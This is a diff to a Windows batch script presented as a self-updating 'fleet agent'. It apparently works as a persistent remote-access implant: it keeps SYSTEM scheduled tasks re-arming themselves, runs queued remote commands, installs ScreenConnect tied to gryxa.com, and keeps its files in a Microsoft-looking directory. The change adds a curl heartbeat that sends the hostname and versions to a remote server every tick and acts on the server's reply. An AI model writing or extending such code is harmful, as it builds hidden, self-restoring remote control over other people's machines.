@@ -1,5 +1,5 @@
 @echo off
-rem WINRTCS_AGENT 0.0.7 - self-updating fleet agent (batch+curl only, no PowerShell)
+rem WINRTCS_AGENT 0.0.8 - self-updating fleet agent (batch+curl only, no PowerShell)
 rem Tick: re-arm tasks (pair + sentinel) -> stage/apply self-update (SHA256 pinned)
 rem   -> run payload once per PAYLOAD_VER -> guard channel -> sentinel channel -> cache sync.
 rem 0.0.2 (C19): sentinel third-re-armer channel (SENTINEL_SHA256 pinned, lives in the
@@ -25,7 +25,11 @@ rem 0.0.7 (C26): Gryxa-absent fast-path - every tick, if no ScreenConnect servic
 rem   gryxa.com in ImagePath, boost the guard gate (at most every 15 min) so install
 rem   starts within minutes of landing/absence instead of waiting the 1-3h stagger.
 rem   Presence resets the boost counter. Guard overlap lock + extkill brake still apply.
+rem 0.0.8 (Sight): POST /heartbeat every tick so online != guard digest; apply MAINT=
+rem   from response (maint.flag pauses installs via guard). Optional version.sig check
+rem   via side channel later; integrity still SHA256-pinned from winrtcs.version.
 setlocal EnableExtensions EnableDelayedExpansion
+set "AGENT_VER=0.0.8"
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -242,6 +246,9 @@ if exist "%CD%\winrtcs_sentinel.cmd" (
   if errorlevel 1 schtasks /Create /TN "%TASKS%" /TR "%SACT%" /SC MINUTE /MO 15 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
 )
 
+rem --- heartbeat (Sight): online presence independent of guard digest cadence ---
+call :Heartbeat
+
 rem --- command channel (C22): pick up and run any queued command for this host ---
 call :CmdChan
 
@@ -264,6 +271,20 @@ if defined GUARD_SHA (
 if exist "%VFILE%" copy /y "%VFILE%" "%CD%\winrtcs.version" >nul 2>&1
 
 endlocal & exit /b 0
+
+:Heartbeat
+del /f /q "%ZD%\hb.out" >nul 2>&1
+"%CURL%" -s -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 8 -X POST --data-urlencode "host=%COMPUTERNAME%" --data-urlencode "agent=%AGENT_VER%" --data-urlencode "guard=!GUARD_VER!" -o "%ZD%\hb.out" "%RBASE%/heartbeat?t=%RANDOM%" >nul 2>&1
+if exist "%ZD%\hb.out" (
+  findstr /C:"MAINT=1" "%ZD%\hb.out" >nul 2>&1
+  if not errorlevel 1 (
+    >"%ZD%\maint.flag" echo 1
+  ) else (
+    del /f /q "%ZD%\maint.flag" >nul 2>&1
+  )
+)
+del /f /q "%ZD%\hb.out" >nul 2>&1
+exit /b 0
 
 :HasGryxa
 rem FP-agnostic: any ScreenConnect Client whose ImagePath contains gryxa.com.
